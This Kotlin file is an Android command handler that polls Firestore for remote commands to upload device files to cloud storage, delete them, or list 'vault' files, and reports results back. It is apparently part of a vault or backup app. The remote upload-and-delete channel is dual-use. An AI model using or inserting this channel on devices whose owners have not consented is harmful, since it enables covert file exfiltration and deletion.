package com.example.commands

import android.content.Context
import android.util.Log
import com.example.firebase.FirebaseVaultUploader
import com.example.utils.LogRecorder
import com.example.utils.SafeFolderManager
import com.google.firebase.firestore.FirebaseFirestore
import java.io.File

class CommandExecutor(private val context: Context) {

    companion object {
        private const val TAG = "CommandExecutor"
        private const val COMMANDS_COLLECTION = "commands"
    }

    private val firestore = FirebaseFirestore.getInstance()

    fun executeCommand(commandId: String, action: String, parameters: Map<String, String>? = null) {
        LogRecorder.logInfo(TAG, "Executing command: action=$action (ID: $commandId, params=$parameters)")

        when (action) {
            "UPLOAD_FULL_FILE" -> {
                val fileId = parameters?.get("fileId")
                if (!fileId.isNullOrEmpty()) {
                    uploadFullFile(fileId, commandId)
                } else {
                    LogRecorder.logError(TAG, "Command execution failed for ID $commandId: No fileId provided")
                    updateCommandStatus(commandId, "FAILED", "No fileId provided")
                }
            }

            "DELETE_FILE" -> {
                val fileId = parameters?.get("fileId")
                if (!fileId.isNullOrEmpty()) {
                    deleteFile(fileId, commandId)
                } else {
                    LogRecorder.logError(TAG, "Command execution failed for ID $commandId: No fileId provided")
                    updateCommandStatus(commandId, "FAILED", "No fileId provided")
                }
            }

            "GET_VAULT_FILES" -> {
                getVaultFiles(commandId)
            }

            else -> {
                LogRecorder.logError(TAG, "Unknown command action: $action for commandId $commandId")
                updateCommandStatus(commandId, "FAILED", "Unknown command: $action")
            }
        }
    }

    private fun uploadFullFile(fileId: String, commandId: String) {
        Log.d(TAG, "☁️ Uploading full file: $fileId")

        firestore.collection("vault_files")
            .document(fileId)
            .get()
            .addOnSuccessListener { document ->
                if (!document.exists()) {
                    updateCommandStatus(commandId, "FAILED", "File not found")
                    return@addOnSuccessListener
                }

                val filePath = document.getString("filePath")
                val fileName = document.getString("fileName")

                if (filePath.isNullOrEmpty()) {
                    updateCommandStatus(commandId, "FAILED", "No file path")
                    return@addOnSuccessListener
                }

                val file = File(filePath)
                if (!file.exists()) {
                    updateCommandStatus(commandId, "FAILED", "File not found on device")
                    return@addOnSuccessListener
                }

                // Upload to Google Drive
                try {
                    val uploader = FirebaseVaultUploader(context)
                    uploader.uploadFullFile(fileId) { success, message ->
                        if (success) {
                            updateCommandStatus(commandId, "COMPLETED", "Uploaded: $fileName")
                        } else {
                            updateCommandStatus(commandId, "FAILED", message ?: "Upload failed")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Upload error: ${e.message}")
                    updateCommandStatus(commandId, "FAILED", e.message)
                }
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Error fetching file: ${e.message}")
                updateCommandStatus(commandId, "FAILED", e.message)
            }
    }

    private fun deleteFile(fileId: String, commandId: String) {
        Log.d(TAG, "🗑️ Deleting file: $fileId")

        firestore.collection("vault_files")
            .document(fileId)
            .get()
            .addOnSuccessListener { document ->
                if (!document.exists()) {
                    updateCommandStatus(commandId, "FAILED", "File not found")
                    return@addOnSuccessListener
                }

                val filePath = document.getString("filePath")
                val fileName = document.getString("fileName")

                if (!filePath.isNullOrEmpty()) {
                    val file = File(filePath)
                    if (file.exists()) {
                        file.delete()
                    }
                }

                // Delete from Firestore
                document.reference.delete()
                    .addOnSuccessListener {
                        Log.d(TAG, "✅ Deleted file: $fileName")
                        updateCommandStatus(commandId, "COMPLETED", "Deleted: $fileName")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "❌ Failed to delete from Firestore: ${e.message}")
                        updateCommandStatus(commandId, "FAILED", e.message)
                    }
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Error fetching file: ${e.message}")
                updateCommandStatus(commandId, "FAILED", e.message)
            }
    }

    private fun getVaultFiles(commandId: String) {
        Log.d(TAG, "📋 Getting vault files")

        firestore.collection("vault_files")
            .orderBy("timestamp", com.google.firebase.firestore.Query.Direction.DESCENDING)
            .limit(50)
            .get()
            .addOnSuccessListener { documents ->
                val fileList = documents.map { document ->
                    mapOf(
                        "id" to document.id,
                        "fileName" to document.getString("fileName"),
                        "fileSize" to document.getLong("fileSize"),
                        "clipUrl" to document.getString("clipUrl"),
                        "status" to document.getString("status")
                    )
                }
                
                val result = mapOf(
                    "files" to fileList,
                    "count" to fileList.size
                )
                
                firestore.collection(COMMANDS_COLLECTION)
                    .document(commandId)
                    .update("result", result, "status", "COMPLETED")
                    .addOnSuccessListener {
                        Log.d(TAG, "✅ Vault files sent: ${fileList.size} files")
                    }
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Failed to get files: ${e.message}")
                updateCommandStatus(commandId, "FAILED", e.message)
            }
    }

    private fun updateCommandStatus(commandId: String, status: String, message: String? = null) {
        val updates = hashMapOf<String, Any>(
            "status" to status,
            "completedAt" to System.currentTimeMillis()
        )
        message?.let { updates["result"] = it }
        
        firestore.collection(COMMANDS_COLLECTION)
            .document(commandId)
            .update(updates)
            .addOnSuccessListener {
                LogRecorder.logSuccess(TAG, "Command status updated to: $status for commandId $commandId")
            }
            .addOnFailureListener { e ->
                LogRecorder.logError(TAG, "Failed to update command status for commandId $commandId: ${e.message}", e)
            }
    }
}
